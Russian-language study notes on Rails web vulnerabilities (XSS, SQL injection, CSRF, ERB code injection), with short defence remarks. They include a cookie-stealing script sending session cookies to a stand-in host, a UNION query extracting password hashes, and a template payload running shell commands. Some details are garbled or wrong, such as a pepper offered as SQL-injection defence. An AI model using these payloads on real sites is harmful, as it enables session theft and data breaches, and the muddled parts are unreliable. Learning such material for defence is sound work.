XSS - это уязвимость при которой хакер получает возможность внедрить свой JavaScript код на сайт . 
Как это обычно происходит ?
Хакер обычно регистрируется на сайте . И начинает испытывать его на прочность . Для этого он например заходит в форму редактирования профиля . И пытается внедрить туда простой JavaScript code . Обновляет и видит что этот код сработал . То есть уязвимость здесь присутствует . При определенных обстоятельствах он может похитить сессий пользователей . Для этого он может создать свой какой-то сайт . И создать код где он получает cookie пользователя и отправляет на свой сайт .
```js
<script>
var x = new HMLHttpRequest();
x.open("GET","http:hacker-site.test/save_cookie?cookie="+encodeURIComponent(document.cookie),!0);x.send();
</script>
```
Теперь каждый пользователь который зайдет на эту страницу . Cookie этого пользователя отправятся на его сайт . К Хакеру прилетела эта Cookie . Он берет редактирует через Cookie . Сохраняет . Обновляет и он уже залогинен как Боб .

Как защитится от атаки ?
По умолчанию Рейлс всегда экранирует html символы когда мы пытаемся вывести строку в URLB шаблоне .
Когда мы вызываем html_safe мы по сути говорим рейлсе что строка на 100 процентов безопасна . Мы все проверили опасного кода в ней нет
![[Pasted image 20250915194411.png]]
![[Pasted image 20250915194400.png]]Желательно все места где ввод от пользователя обрабатывать с помощью Helperov например "strip_tags()"
![[Pasted image 20250915194626.png]]
На самом деле в Рейлс есть защита от кражи Cookie . У Cookies есть множества различных флагов . Например HttpOnly . Когда он выключен мы можем с помощью JavaScript получить cookie . Но если мы включим этот флаг .


SQL - Injection - самая опасная уязвимость . Это уязвимость при которой злоумышлиник может внедрить свой собственный код в ваш SQL запрос . Обычно хакеры проверяют на SQL уязвимость с помощью кавычки . Нам нужно отсечь остальную часть запроса . И у нас запрос срабатывает .
```sql
http://social.test/payments?year=2024)ORDER by id desc--
```
Чтобы вывести платежи всех пользователей :
```sql
SELECT
"payments".*
FROM "payments"
WHERE
"payments"."sender_id" = 6
AND (extract(year from created_at) = OR 1=1)
UNION SELECT id,id,id,ecrypted_password,'email','balance',NOW(),NOW() from USERS--
```

Защита от SQL injection 
У гема device есть такой config.pepper ='jhbtgvfc' . И даже если хэши кто-то украдет они будут бесполезны без вот этой Соли . Главное эту соль потом не потерять .

CSRF - Cross-Side request forgery . Очень хитрая уязвимость .
![[Pasted image 20250915201049.png]]
Пример атаки CSRF . Хакеру понравилась форма перевода денег на вашем сайте . Он создает како-то фишинговый сайт . Потом идет на наш сайт копирует эту форму . Открывает код своего сайта . добовляет туда форму . Убирает все лишнее . 
![[Pasted image 20250915201448.png]]Каждый кто нажмет на кнопку . По факту будет сабмитить вот эту форму перевода денег .

В рубиан рейлс есть несколько видов защиты от этой атаки . Same_site : lax (запрещает пост запросы)![[Pasted image 20250915201829.png]]
Есть хакер обнаружит что даже оплата у нас возможна через гет запрос . И хакер меняет свою форму на ссылку . 
Атаку CSRF комбинируют с атаку с XSS

Защита от атаки CSRF :
1 Следуем правилам REST
2 Не отключаем защиту от CSRF 

Code Injection - самая редкая и опасная уязвимость . Наш хакер зашел в пеименты открыл чек . Смотрит на него и решает попытатся поиграться . Он пишет например .

```
Hacker<%= `ls -la` %>
```
Обновляет чек и видим что команда выполнилась . И по сути видим что он заинектил свой код.
Ошибка render inline получает то что нам вернул render_liquid кода а потом еще раз обрабатывает результат как ERB шаблон . Нужно использовать render_html . 
![[Pasted image 20250916153810.png]]

async function fetchData() {
  try {
    let response = await fetch("https://invalid-url.com");
    let data = await response.json();
    console.log(data);
    console.log('Hello')
  } catch (error) {
    console.log("Ошибка при запросе:", error.message);
  }
}

fetchData();

